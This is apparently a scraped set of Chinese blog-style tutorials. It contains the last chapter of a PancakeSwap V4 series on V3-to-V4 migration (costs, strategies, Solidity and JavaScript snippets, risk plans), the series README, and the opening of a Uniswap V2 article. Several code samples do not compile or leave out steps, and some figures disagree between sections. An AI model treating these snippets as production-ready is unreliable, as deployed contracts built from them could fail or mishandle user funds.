迁移成本分析\n成本组成\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n成本项说明预估成本开发成本开发迁移工具、新功能50,000 - 100,000测试成本全面测试、审计20,000 - 50,000部署成本部署到主网1,000 - 5,000用户教育文档、教程、支持10,000 - 30,000迁移风险潜在的业务中断10,000 - 50,000总计91,000 - 235,000\n收益分析\n假设每天执行以下操作：\n\n100次swap\n10次添加流动性\n5次移除流动性\n1次创建池子（每周1次）\n\n年度Gas节省（来自第6章）：\n年度Gas节省 = 1,694,900,000 gas/year\n\n以30 gwei计算：\nETH节省 = 1,694,900,000 × 30 / 1e9 = 50.847 ETH/year\nUSD节省 = 50.847 × $2000 = $101,694/year\n\nROI计算：\n回本周期 = 总成本 / 年度节省\n        = $235,000 / $101,694\n        = 2.31 年\n\n3年总收益 = $101,694 × 3 - $235,000 = $70,082\n5年总收益 = $101,694 × 5 - $235,000 = $273,470\n\n1.3 迁移时间线\ngantt\n    title V3到V4迁移时间线\n    dateFormat  YYYY-MM-DD\n    section 准备阶段\n    需求分析       :done,    des1, 2024-01-01, 14d\n    技术方案设计     :active,  des2, 2024-01-15, 14d\n    安全评估         :         des3, 2024-01-29, 14d\n\n    section 开发阶段\n    开发迁移工具     :         dev1, 2024-02-12, 21d\n    开发新功能       :         dev2, 2024-02-12, 28d\n    单元测试         :         dev3, 2024-03-11, 21d\n\n    section 测试阶段\n    集成测试         :         test1, 2024-04-01, 14d\n    安全审计         :         test2, 2024-04-15, 21d\n    测试网部署       :         test3, 2024-05-06, 14d\n\n    section 部署阶段\n    用户教育         :         dep1, 2024-05-20, 14d\n    主网部署         :         dep2, 2024-06-03, 7d\n    灰度发布         :         dep3, 2024-06-10, 21d\n    正式上线         :milestone, 2024-07-01, 0d\n\n    section 运营阶段\n    监控优化         :         ops1, 2024-07-01, 30d\n    反馈迭代         :         ops2, 2024-07-31, 60d\n\n\n2. 迁移策略\n2.1 策略1：并行运行\n概述\nV3和V4同时运行，用户可以选择使用哪个版本。\nflowchart LR\n    subgraph User[&quot;用户&quot;]\n        U1[&quot;可以选择&quot;]\n        U2[&quot;V3或V4&quot;]\n    end\n\n    subgraph V3[&quot;V3系统&quot;]\n        V3F[Factory]\n        V3P1[Pool 1]\n        V3P2[Pool 2]\n    end\n\n    subgraph V4[&quot;V4系统&quot;]\n        V4S[Singleton]\n        V4P1[Pool 1]\n        V4P2[Pool 2]\n    end\n\n    User --&gt; V3\n    User --&gt; V4\n\n    style V4 fill:#c8e6c9\n\n优点与缺点\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n优点缺点用户可自主选择维护两套系统风险较低用户体验可能混淆可以逐步迁移数据需要同步\n实施步骤\n\n\n准备阶段（1-2周）\n\n评估V4功能\n规划迁移路径\n准备用户文档\n\n\n\n开发阶段（3-4周）\n\n部署V4 Singleton\n开发V4版本的池子\n开发数据同步工具\n\n\n\n测试阶段（2-3周）\n\n在测试网部署\n全面测试V4功能\n性能对比测试\n\n\n\n部署阶段（1-2周）\n\n部署到主网\n创建V4版本的池子\n发布迁移指南\n\n\n\n运营阶段（持续）\n\n监控两套系统\n收集用户反馈\n逐步引导用户使用V4\n\n\n\n2.2 策略2：渐进迁移\n概述\n逐步将V3池子迁移到V4，逐步关闭V3。\ntimeline\n    title 渐进迁移时间线\n    section 第一阶段\n        部署V4 Singleton : 1周\n        创建测试池子 : 1周\n        小规模测试 : 1周\n    section 第二阶段\n        迁移低TVL池子 : 2周\n        监控V4性能 : 1周\n        收集用户反馈 : 1周\n    section 第三阶段\n        迁移中TVL池子 : 3周\n        优化V4功能 : 2周\n        用户教育 : 1周\n    section 第四阶段\n        迁移高TVL池子 : 2周\n        准备关闭V3 : 1周\n    section 第五阶段\n        完全迁移 : 1周\n        关闭V3 : 1周\n\n迁移优先级\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n优先级池子类型理由时间1低TVL池子风险低，测试V4第1-2周2新创建池子直接在V4创建第3-4周3中TVL池子验证V4稳定性第5-7周4高TVL池子最后迁移，确保安全第8-10周\n实施步骤\n\n\n准备V4环境（1周）\n# 1. 部署V4 Singleton\nforge create \\\n    src/PancakeV4PoolManager.sol:PancakeV4PoolManager \\\n    --rpc-url $MAINNET_RPC_URL \\\n    --broadcast \\\n    --verify\n \n# 2. 验证部署\ncast call $SINGLETON_ADDRESS &quot;poolCount()&quot;\n\n\n创建测试池子（1周）\n// 在V4中创建测试池子\nconst poolId = await poolManager.createPool(\n    token0Address,\n    token1Address,\n    feeRate,  // 300 = 0.03%\n    hookAddress\n);\n\n\n迁移低TVL池子（2周）\n// 迁移脚本\nasync function migratePool(v3PoolAddress, v4PoolId) {\n    // 1. 获取V3池子流动性\n    const v3Liquidity = await getV3Liquidity(v3PoolAddress);\n \n    // 2. 在V4中添加相同流动性\n    await v4PoolManager.addLiquidity({\n        poolId: v4PoolId,\n        amount0: v3Liquidity.amount0,\n        amount1: v3Liquidity.amount1,\n        tickLower: v3Liquidity.tickLower,\n        tickUpper: v3Liquidity.tickUpper\n    });\n \n    // 3. 从V3移除流动性\n    await v3Pool.burn(\n        v3Liquidity.tickLower,\n        v3Liquidity.tickUpper,\n        v3Liquidity.amount\n    );\n}\n\n\n2.3 策略3：硬迁移\n概述\n在特定时间点，所有V3池子立即迁移到V4。\nflowchart TB\n    A[V3运行中] --&gt; B{迁移时间到?}\n    B --&gt;|否| A\n    B --&gt;|是| C[执行迁移脚本]\n    C --&gt; D[验证V4状态]\n    D --&gt; E{验证通过?}\n    E --&gt;|否| F[回滚到V3]\n    E --&gt;|是| G[关闭V3]\n    F --&gt; A\n    G --&gt; H[V4正式运行]\n\n    style H fill:#c8e6c9\n\n优点与缺点\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n优点缺点一次完成风险最高不需要并行维护可能造成服务中断用户不会混淆需要充分测试\n实施步骤\n\n\n准备阶段（4-6周）\n\n开发完整迁移工具\n在测试网反复测试\n准备回滚方案\n\n\n\n预演阶段（1-2周）\n\n在测试网完整预演\n验证所有场景\n优化迁移脚本\n\n\n\n迁移执行（1天）\n# 迁移脚本\n./scripts/migrate.sh --dry-run  # 预演\n./scripts/migrate.sh --execute  # 执行\n\n\n验证阶段（1周）\n\n验证V4功能正常\n检查数据完整性\n监控性能指标\n\n\n\n关闭V3（1天）\n# 关闭V3池子\n./scripts/disable-v3-pools.sh\n\n\n\n3. 兼容性处理\n3.1 接口兼容\nV3接口\ninterface IUniswapV3Pool {\n    struct Slot0 {\n        uint160 sqrtPriceX96;\n        int24 tick;\n        uint16 observationIndex;\n        uint16 observationCardinality;\n        uint16 observationCardinalityNext;\n        uint8 feeProtocol;\n        bool unlocked;\n    }\n \n    function swap(\n        address recipient,\n        bool zeroForOne,\n        int256 amountSpecified,\n        uint160 sqrtPriceLimitX96,\n        bytes calldata data\n    ) external returns (int256 amount0, int256 amount1);\n}\nV4接口\ninterface IPancakeV4PoolManager {\n    function swap(\n        address token0,\n        address token1,\n        uint24 fee,\n        int256 amountSpecified,\n        uint160 sqrtPriceLimitX96,\n        bytes calldata data\n    ) external payable returns (int256 amount0, int256 amount1);\n}\n兼容层\ncontract V3CompatibilityLayer {\n    IPancakeV4PoolManager public v4PoolManager;\n \n    function swap(\n        address recipient,\n        bool zeroForOne,\n        int256 amountSpecified,\n        uint160 sqrtPriceLimitX96,\n        bytes calldata data\n    ) external returns (int256 amount0, int256 amount1) {\n        // 从data中解析token0和token1\n        (address token0, address token1, uint24 fee) =\n            abi.decode(data, (address, address, uint24));\n \n        // 调用V4接口\n        return v4PoolManager.swap(\n            token0,\n            token1,\n            fee,\n            amountSpecified,\n            sqrtPriceLimitX96,\n            data\n        );\n    }\n}\n3.2 数据迁移\nV3数据结构\nstruct V3PoolData {\n    address token0;\n    address token1;\n    uint24 fee;\n    uint160 sqrtPriceX96;\n    int24 tick;\n    uint128 liquidity;\n    mapping(int24 =&gt; Tick.Info) ticks;\n    mapping(bytes32 =&gt; Position.Info) positions;\n}\nV4数据结构\nstruct V4PoolData {\n    address token0;\n    address token1;\n    uint24 fee;\n    uint160 sqrtPriceX96;\n    int24 tick;\n    uint128 liquidity;\n    // 存储在Singleton中\n}\n迁移脚本\n// 迁移V3池子数据到V4\nasync function migratePoolData(v3PoolAddress, v4PoolId) {\n    // 1. 获取V3池子数据\n    const v3Pool = await ethers.getContractAt(\n        &quot;IUniswapV3Pool&quot;,\n        v3PoolAddress\n    );\n \n    const slot0 = await v3Pool.slot0();\n    const liquidity = await v3Pool.liquidity();\n \n    // 2. 在V4中创建池子（如果不存在）\n    if (v4PoolId === 0) {\n        v4PoolId = await v4PoolManager.createPool(\n            await v3Pool.token0(),\n            await v3Pool.token1(),\n            await v3Pool.fee(),\n            ethers.constants.AddressZero  // 无Hook\n        );\n    }\n \n    // 3. 迁移tick数据\n    const tickSpacing = await v3Pool.tickSpacing();\n    const tickBitmap = await v3Pool.tickBitmap();\n \n    // 遍历所有初始化的tick\n    for (let word = 0; word &lt; tickBitmap.length; word++) {\n        let bits = tickBitmap[word];\n        while (bits !== 0n) {\n            const bit = bits &amp; -bits;  // 最低位的1\n            const tick = word * 256 + Math.log2(bit);\n            const tickInfo = await v3Pool.ticks(tick);\n \n            // 在V4中创建tick\n            await v4PoolManager.crossTick(tick, tickInfo);\n \n            bits ^= bit;  // 清除最低位的1\n        }\n    }\n \n    // 4. 迁移position数据\n    const positionManager = await ethers.getContractAt(\n        &quot;INonfungiblePositionManager&quot;,\n        positionManagerAddress\n    );\n \n    // 遍历所有positions\n    const totalSupply = await positionManager.totalSupply();\n    for (let i = 0; i &lt; totalSupply; i++) {\n        const position = await positionManager.positions(i);\n \n        // 在V4中创建对应的position\n        await v4PoolManager.mint({\n            poolId: v4PoolId,\n            tickLower: position.tickLower,\n            tickUpper: position.tickUpper,\n            amount: position.liquidity\n        });\n    }\n \n    return v4PoolId;\n}\n3.3 用户体验\n迁移提示\ncontract MigrationNotice {\n    address public v3Pool;\n    address public v4Pool;\n \n    event PoolMigrated(\n        address indexed from,\n        address indexed to,\n        uint256 timestamp\n    );\n \n    function checkMigration() external view returns (\n        bool isMigrated,\n        address newPool,\n        uint256 migratedAt\n    ) {\n        return (\n            v4Pool != address(0),\n            v4Pool,\n            migrationTime\n        );\n    }\n \n    function migrate() external {\n        require(\n            msg.sender == owner,\n            &quot;Only owner&quot;\n        );\n \n        v4Pool = v4PoolManager.getPool(\n            IV3Pool(v3Pool).token0(),\n            IV3Pool(v3Pool).token1(),\n            IV3Pool(v3Pool).fee()\n        );\n \n        emit PoolMigrated(v3Pool, v4Pool, block.timestamp);\n    }\n}\n\n4. 风险管理\n4.1 风险识别\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n风险可能性影响优先级迁移失败中高高数据丢失低极高高V4 Bug中高高用户流失中中中Gas成本增加低低低\n4.2 风险缓解\n风险1：迁移失败\n缓解措施：\n\n充分测试\n准备回滚方案\n分阶段迁移\n监控迁移过程\n\n回滚方案：\n#!/bin/bash\n \n# 回滚脚本\nfunction rollback() {\n    echo &quot;开始回滚...&quot;\n \n    # 1. 重新启用V3池子\n    ./scripts/enable-v3-pools.sh\n \n    # 2. 禁用V4池子\n    ./scripts/disable-v4-pools.sh\n \n    # 3. 通知用户\n    ./scripts/notify-users.sh &quot;Rollback completed&quot;\n \n    echo &quot;回滚完成&quot;\n}\n \n# 检查V4是否正常\nif ! ./scripts/check-v4-health.sh; then\n    echo &quot;V4不健康，执行回滚&quot;\n    rollback\nfi\n风险2：数据丢失\n缓解措施：\n\n备份所有数据\n验证数据完整性\n实施严格的测试\n\n数据备份：\n#!/bin/bash\n \n# 数据备份脚本\nBACKUP_DIR=&quot;./backups/$(date +%Y%m%d_%H%M%S)&quot;\nmkdir -p $BACKUP_DIR\n \n# 备份V3数据\nforge script script/ExportV3Data.sol \\\n    --rpc-url $MAINNET_RPC_URL \\\n    --broadcast \\\n    -o $BACKUP_DIR/v3_data.json\n \n# 备份V4数据（如果已部署）\nforge script script/ExportV4Data.sol \\\n    --rpc-url $MAINNET_RPC_URL \\\n    --broadcast \\\n    -o $BACKUP_DIR/v4_data.json\n \necho &quot;备份完成: $BACKUP_DIR&quot;\n风险3：V4 Bug\n缓解措施：\n\n多重审计\n测试网充分测试\n灰度发布\n准备Hotfix\n\nHotfix流程：\nflowchart TB\n    A[发现Bug] --&gt; B[评估影响]\n    B --&gt; C{严重?}\n    C --&gt;|是| D[立即修复]\n    C --&gt;|否| E[计划修复]\n    D --&gt; F[审计Hotfix]\n    F --&gt; G[部署Hotfix]\n    E --&gt; H[下一个版本修复]\n    G --&gt; H\n    H --&gt; I[验证修复]\n    I --&gt; J[发布更新]\n\n    style D fill:#ffcdd2\n    style G fill:#c8e6c9\n\n\n5. 最佳实践\n5.1 开发最佳实践\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n实践说明重要性代码审计多重审计，包括知名审计公司极高测试覆盖率&gt;90%的测试覆盖率高文档完善详细的技术和用户文档高监控告警实时监控和告警中应急预案准备详细的应急预案极高\n5.2 部署最佳实践\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n实践说明重要性分阶段部署测试网 → 主网灰度 → 全量极高回滚准备准备可回滚的部署极高监控日志详细的部署日志和监控高团队协调团队成员明确分工高用户通知提前通知用户维护窗口中\n5.3 运营最佳实践\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n实践说明重要性用户支持提供充分的用户支持高数据监控持续监控关键指标极高性能优化根据监控结果优化性能中反馈收集收集用户反馈并改进中安全更新及时修复安全漏洞极高\n\n6. 迁移检查清单\n6.1 准备阶段\n\n 完成需求分析\n 制定迁移策略\n 评估技术风险\n 准备开发资源\n 制定时间计划\n\n6.2 开发阶段\n\n 开发迁移工具\n 开发V4功能\n 编写单元测试\n 编写集成测试\n 进行代码审计\n\n6.3 测试阶段\n\n 部署到测试网\n 执行完整测试\n 性能对比测试\n 安全审计\n 修复发现的问题\n\n6.4 部署阶段\n\n 部署到主网\n 验证部署成功\n 执行数据迁移\n 验证数据完整性\n 准备应急预案\n\n6.5 运营阶段\n\n 监控系统性能\n 收集用户反馈\n 处理用户问题\n 优化系统性能\n 计划后续迭代\n\n\n7. 本章小结\n7.1 迁移策略总结\nmindmap\n  root((V3到V4迁移))\n    并行运行\n      用户可自主选择\n      风险较低\n      维护两套系统\n    渐进迁移\n      逐步迁移池子\n      降低风险\n      需要时间较长\n    硬迁移\n      一次完成\n      风险最高\n      不需要并行维护\n\n7.2 关键成功因素\nmindmap\n  root((成功因素))\n    技术准备\n      充分测试\n      代码审计\n      数据备份\n    风险管理\n      风险识别\n      缓解措施\n      应急预案\n    用户支持\n      文档完善\n      培训教育\n      技术支持\n    监控优化\n      实时监控\n      性能优化\n      反馈改进\n\n7.3 ROI分析\n投资：\n\n开发成本：$100,000\n测试成本：$50,000\n部署成本：$5,000\n用户教育：$30,000\n迁移风险：$50,000\n总计：$235,000\n\n回报（年度）：\n\nGas节省：$101,694\n新功能收益：$50,000\n用户体验改善：$20,000\n总计：$171,694\n\nROI：\n回本周期 = $235,000 / $171,694 = 1.37 年\n3年总ROI = ($171,694 × 3 - $235,000) / $235,000 = 119.3%\n\n\n系列总结\n至此，我们已经完成了「死磕PancakeSwap V4」系列的全部8篇文章，涵盖：\n\nV4架构与核心创新 - Singleton、Hooks、Native ETH\nHooks机制详解 - Hooks类型、数学模型、实现原理\nSingleton架构与Flash Accounting - 存储优化、闪电记账、数学推导\n费用系统的数学推导 - 动态费用、数学证明、计算实例\n动态流动性机制 - JIT流动性、数学建模、优化策略\nNative ETH与Gas优化 - ETH直接支持、Gas优化数学\nHooks实战与最佳实践 - Hooks开发、安全实践、案例分析\nV3到V4的迁移与升级 - 迁移策略、兼容性、最佳实践\n\n每一章都包含了详细的数学推导和实际代码示例，帮助深入理解PancakeSwap V4的革命性创新。\n\n参考资料\n\nPancakeSwap V4 迁移指南\nUniswap V4 迁移最佳实践\n区块链迁移策略论文\n软件工程最佳实践\n\n\nHappy Learning! 🚀"},"blockchainguide/DApp_Development/应用场景/defi/pancake/v4/README":{"slug":"blockchainguide/DApp_Development/应用场景/defi/pancake/v4/README","filePath":"blockchainguide/DApp_Development/应用场景/defi/pancake/v4/README.md","title":"README","links":["blockchainguide/DApp_Development/应用场景/defi/pancake/v4/01-V4架构与核心创新","blockchainguide/DApp_Development/应用场景/defi/pancake/v4/02-Hooks机制详解","blockchainguide/DApp_Development/应用场景/defi/pancake/v4/03-Singleton架构与FlashAccounting","blockchainguide/DApp_Development/应用场景/defi/pancake/v4/04-费用系统的数学推导","blockchainguide/DApp_Development/应用场景/defi/pancake/v4/05-动态流动性机制","blockchainguide/DApp_Development/应用场景/defi/pancake/v4/06-Native-ETH与Gas优化","blockchainguide/DApp_Development/应用场景/defi/pancake/v4/07-Hooks实战与最佳实践","blockchainguide/DApp_Development/应用场景/defi/pancake/v4/08-V3到V4的迁移与升级"],"tags":[],"content":"死磕PancakeSwap V4 系列文章\n\n深入剖析PancakeSwap V4的革命性创新、Hooks机制与数学原理\n\n系列概述\n本系列共8篇文章，从基础概念到高级数学推导，全面解析PancakeSwap V4的设计实现，特别注重Hooks机制和数学公式的推导过程。\nflowchart LR\n    subgraph 基础篇[&quot;基础篇 (1-2)&quot;]\n        A1[01-V4架构与核心创新]\n        A2[02-Hooks机制详解]\n    end\n\n    subgraph 核心篇[&quot;核心篇 (3-5)&quot;]\n        B1[03-Singleton架构与Flash Accounting]\n        B2[04-费用系统的数学推导]\n        B3[05-动态流动性机制]\n    end\n\n    subgraph 进阶篇[&quot;进阶篇 (6-8)&quot;]\n        C1[06-Native ETH与Gas优化]\n        C2[07-Hooks实战与最佳实践]\n        C3[08-V3到V4的迁移与升级]\n    end\n\n    基础篇 --&gt; 核心篇 --&gt; 进阶篇\n\n文章目录\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n序号标题核心内容难度01V4架构与核心创新Singleton、Hooks、Native ETH⭐⭐02Hooks机制详解Hooks类型、数学模型、实现原理⭐⭐⭐⭐03Singleton架构与Flash Accounting存储优化、闪电记账、数学推导⭐⭐⭐⭐⭐04费用系统的数学推导动态费用、数学证明、计算实例⭐⭐⭐⭐⭐05动态流动性机制JIT流动性、数学建模、优化策略⭐⭐⭐⭐06Native ETH与Gas优化ETH直接支持、Gas优化数学⭐⭐⭐⭐07Hooks实战与最佳实践Hooks开发、安全实践、案例分析⭐⭐⭐⭐⭐08V3到V4的迁移与升级迁移策略、兼容性、最佳实践⭐⭐⭐\n学习路径\n入门读者\n如果你是DeFi新手，建议按顺序阅读：\n\n第一篇：了解V4的架构变革和核心创新\n第二篇：深入理解Hooks机制的设计原理\n第三篇：掌握Singleton架构的数学基础\n\n中级读者\n如果你已有V3开发经验：\n\n重点阅读第二、三篇，理解Hooks和Flash Accounting\n深入第四、五篇，掌握数学推导\n学习第六篇的Gas优化技巧\n\n高级读者\n如果你想深入研究：\n\n深入第二篇的Hooks数学模型\n研究第三、四篇的数学推导\n实践第七篇的Hooks开发\n规划第八篇的迁移策略\n\n核心概念速查\nV4核心创新\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n创新点V3V4说明池子架构每个池子独立合约Singleton单一合约节省大量gas自定义能力有限Hooks完全可定制最大的创新ETH支持需要WETHNative ETH简化操作费用结构固定费率动态费用更灵活记账系统传统记账Flash Accounting优化转账\n数学公式速查\nFlash Accounting余额追踪:\n    Δbalance_i = Σ(inputs_i) - Σ(outputs_i) - Δeth_balance\n\n动态费用模型:\n    fee(t) = f(σ, V, L, t)\n\nHooks状态更新:\n    S_{t+1} = HookFunction(S_t, Δx, Δy, context)\n\n流动性约束优化:\n    maximize:  E[Return] - λ × Variance\n    subject to:  L(t) ≥ 0,  ∀t\n\nHooks生命周期\nstateDiagram-v2\n    [*] --&gt; BeforeInitialize\n    BeforeInitialize --&gt; AfterInitialize\n    AfterInitialize --&gt; BeforeSwap\n    BeforeSwap --&gt; AfterSwap\n    AfterSwap --&gt; BeforeDonate\n    BeforeDonate --&gt; AfterDonate\n    AfterDonate --&gt; BeforeWithdraw\n    BeforeWithdraw --&gt; AfterWithdraw\n    AfterWithdraw --&gt; [*]\n\n    note right of BeforeSwap\n        可修改交换参数\n        添加自定义逻辑\n    end note\n\n    note right of AfterSwap\n        更新状态\n        触发奖励\n        记录交易\n    end note\n\nV4 vs V3 对比\n架构差异\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n方面V3V4合约数量1个Factory + N个Pool1个Singleton合约创建成本每个池子独立部署在Singleton中创建存储布局每个池子独立存储共享存储池Gas成本创建池子 ~2M gas创建池子 ~150K gas自定义能力有限Hooks完全可定制\n功能差异\ngraph TB\n    subgraph V3[&quot;V3功能&quot;]\n        V3A[固定费率]\n        V3B[集中流动性]\n        V3C[标准swap]\n        V3D[有限的自定义]\n    end\n\n    subgraph V4[&quot;V4功能&quot;]\n        V4A[动态费用]\n        V4B[Hooks自定义]\n        V4C[Native ETH]\n        V4D[Flash Accounting]\n        V4E[更高效]\n    end\n\n    V3A -.-&gt; V4A\n    V3B -.-&gt; V4B\n    V3C -.-&gt; V4C\n    V3D -.-&gt; V4D\n\n    style V4 fill:#ffeb3b\n\nHooks机制核心\nHooks类型\nmindmap\n  root((Hooks类型))\n    Initialize\n      beforeInitialize\n      afterInitialize\n    Swap\n      beforeSwap\n      afterSwap\n    Liquidity\n      beforeAddLiquidity\n      afterAddLiquidity\n      beforeRemoveLiquidity\n      afterRemoveLiquidity\n    Donate\n      beforeDonate\n      afterDonate\n    Withdraw\n      beforeWithdraw\n      afterWithdraw\n\nHooks数学模型\n每个Hook可以被视为一个状态转换函数：\nS_{t+1} = H(S_t, Δx, Δy, context)\n\n其中：\n- S_t: 当前状态\n- Δx, Δy: 代币变化量\n- context: 上下文信息（价格、流动性等）\n- H: Hook函数\n\nFlash Accounting 原理\n传统记账 vs Flash Accounting\ngraph LR\n    subgraph Traditional[&quot;传统记账&quot;]\n        T1[验证余额]\n        T2[转账输入]\n        T3[执行操作]\n        T4[转账输出]\n        T5[验证最终余额]\n    end\n\n    subgraph Flash[&quot;Flash Accounting&quot;]\n        F1[记录初始状态]\n        F2[追踪所有变化]\n        F3[执行操作]\n        F4[计算净变化]\n        F5[一次性结算]\n    end\n\n    Traditional --&gt;|多次转账| Flash\n\n    style Flash fill:#ffeb3b\n\nFlash Accounting数学模型\n净变化计算:\n    Δbalance_i = balance_i^{final} - balance_i^{initial}\n\n结算条件:\n    Σ(Δbalance_i × price_i) = 0  （无套利）\n    balance_i^{final} ≥ 0  （不能为负）\n\n配套资源\n官方资源\n\nPancakeSwap V4 Core 源码\nPancakeSwap V4 Hooks 源码\nPancakeSwap V4 白皮书\nPancakeSwap V4 官方文档\n\n测试网络\n\nBNB Chain Testnet\nGoerli测试网\nSepolia测试网\n\n学习工具\n\nPancakeSwap V4 Hooks IDE\nTenderly - 交易模拟\nFoundry - 测试框架\n\n阅读建议\n\n数学推导：每篇文章的数学部分都配有详细推导和证明\n代码示例：所有关键概念都有对应的Solidity代码\n实战练习：建议在测试网实践Hooks开发\n对比学习：结合V3知识理解V4的改进\n\n为什么要学习V4？\n\n革命性创新：Hooks机制彻底改变了AMM的可定制性\nGas优化：Singleton架构大幅降低部署成本\n数学深度：V4引入了更复杂的数学模型\n未来趋势：V4代表了AMM发展的方向\n实践价值：可以构建高度定制化的DEX功能\n\n更新日志\n\n2024-12：系列文章开始撰写\n\n反馈与交流\n如有问题或建议，欢迎通过Issue讨论。\n\nHappy Learning! 🚀"},"blockchainguide/DApp_Development/应用场景/defi/uniswap/v2/01-V2概述与核心原理":{"slug":"blockchainguide/DApp_Development/应用场景/defi/uniswap/v2/01-V2概述与核心原理","filePath":"blockchainguide/DApp_Development/应用场景/defi/uniswap/v2/01-V2概述与核心原理.md","title":"01-V2概述与核心原理","links":[],"tags":[],"content":"死磕Uniswap V2（一）：V2概述与核心原理\n\n本文是「死磕Uniswap V2」系列的第一篇，深入剖析V2的核心原理——恒定乘积自动做市商(AMM)机制。\n\n系列导航\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n序号标题核心内容01V2概述与核心原理恒定乘积AMM、核心公式02Factory与Pair合约合约结构、创建流程03流动性与LP代币mint/burn、份额计算04交换机制深度解析swap函数、滑点、Flash Swap05价格预言机TWAP、价格计算06Router与路由最佳路径、多跳交易07安全实践与最佳实践漏洞防护、开发建议\n\n1. AMM技术演进\n1.1 什么是AMM？\n传统交易所采用订单簿(Order Book)模式，需要买方和卖方的价格匹配。而AMM(Automated Market Maker)通过数学公式自动定价，无需对手盘即可交易。\ngraph TB\n    subgraph OrderBook[&quot;订单簿模式&quot;]\n        OB1[买单列表]\n        OB2[卖单列表]\n        OB3[价格匹配]\n        OB1 --&gt; OB3\n        OB2 --&gt; OB3\n    end\n\n    subgraph AMM[&quot;AMM模式&quot;]\n        AMM1[流动性池]\n        AMM2[自动定价公式]\n        AMM3[即时交易]\n        AMM1 --&gt; AMM2\n        AMM2 --&gt; AMM3\n    end\n\n    style AMM2 fill:#c8e6c9\n\n1.2 Uniswap发展历程\nflowchart LR\n    V1[&quot;Uniswap V1&lt;br/&gt;2020.5&lt;br/&gt;ETH/ERC20&quot;] --&gt; V2[&quot;Uniswap V2&lt;br/&gt;2020.8&lt;br/&gt;ERC20/ERC20&quot;]\n    V2 --&gt; V3[&quot;Uniswap V3&lt;br/&gt;2021.5&lt;br/&gt;集中流动性&quot;]\n    V3 --&gt; V4[&quot;Uniswap V4&lt;br/&gt;2023.6&lt;br/&gt;Hooks可编程&quot;]\n\n    style V2 fill:#e3f2fd\n\n\n2. 恒定乘积公式\n2.1 核心公式\nUniswap V2基于恒定乘积公式：\nx × y = k\n\n变量含义：\n\nx: Token0的储备量\ny: Token1的储备量\nk: 恒定乘积常数\n\n核心思想： 交易前后，两种代币储备量的乘积保持不变。\n2.2 公式可视化\ngraph LR\n    subgraph Before[&quot;交易前&quot;]\n        X1[&quot;x = 1000&quot;]\n        Y1[&quot;y = 1000&quot;]\n        K1[&quot;k = 1,000,000&quot;]\n    end\n\n    subgraph Swap[&quot;执行交易&quot;]\n        Direction[&quot;用户用100 Token0&lt;br/&gt;换取~91 Token1&quot;]\n    end\n\n    subgraph After[&quot;交易后&quot;]\n        X2[&quot;x = 1100&quot;]\n        Y2[&quot;y = 909&quot;]\n        K2[&quot;k = 999,900 ≈ 1,000,000&quot;]\n    end\n\n    Before --&gt; Swap\n    Swap --&gt; After\n\n    style K1 fill:#c8e6c9\n    style K2 fill:#c8e6c9\n\n2.3 价格推导\n根据恒定乘积公式，代币的相对价格为：\nP = y / x\n\n即：1个Token0的价值 = y/x个Token1\n价格弹性：\n\n当x增加时，y减少\n价格根据供需自动调整\n提供的流动性越深，滑点越小\n\n\n3. 交换公式详解\n3.1 输入输出计算\n假设用户用Δx数量的Token0换取Token1：\n输入Token0，输出Token1：\nΔy = y × Δx / (x + Δx)\n\n输入Token1，输出Token0：\nΔx = x × Δy / (y + Δy)\n\n3.2 交换示例\n场景： ETH/USDC池子\n\n初始储备：x = 100 ETH，y = 200,000 USDC\n用户用10 ETH换取USDC\n\nflowchart LR\n    A[&quot;初始状态&lt;br/&gt;x=100 ETH&lt;br/&gt;y=200,000 USDC&quot;] --&gt; B[&quot;输入: Δx=10 ETH&quot;]\n    B --&gt; C[&quot;计算输出&lt;br/&gt;Δy = 200,000 × 10 / (100 + 10)&quot;]\n    C --&gt; D[&quot;输出: Δy ≈ 18,181 USDC&quot;]\n    D --&gt; E[&quot;最终状态&lt;br/&gt;x=110 ETH&lt;br/&gt;y=181,819 USDC&quot;]\n\n代码实现：\nfunction getAmountOut(\n    uint256 amountIn,\n    uint256 reserveIn,\n    uint256 reserveOut\n) external pure returns (uint256 amountOut) {\n    require(amountIn &gt; 0, &quot;Insufficient amount&quot;);\n    require(reserveIn &gt; 0 &amp;&amp; reserveOut &gt; 0, &quot;Insufficient liquidity&quot;);\n \n    uint256 amountInWithFee = amountIn * 997; // 扣除0.3%费用\n    uint256 numerator = amountInWithFee * reserveOut;\n    uint256 denominator = reserveIn * 1000 + amountInWithFee;\n \n    amountOut = numerator / denominator;\n \n    return amountOut;\n}\n\n4. 滑点现象\n4.1 什么是滑点？\n滑点(Slippage)：实际成交价格与预期价格的差异。\ngraph TB\n    subgraph NoSlippage[&quot;无滑点（理想）&quot;]\n        P1[&quot;预期价格: 1 ETH = 2000 USDC&quot;]\n        P2[&quot;成交价格: 1 ETH = 2000 USDC&quot;]\n        P3[&quot;滑点: 0%&quot;]\n    end\n\n    subgraph WithSlippage[&quot;有滑点（实际）&quot;]\n        P4[&quot;预期价格: 1 ETH = 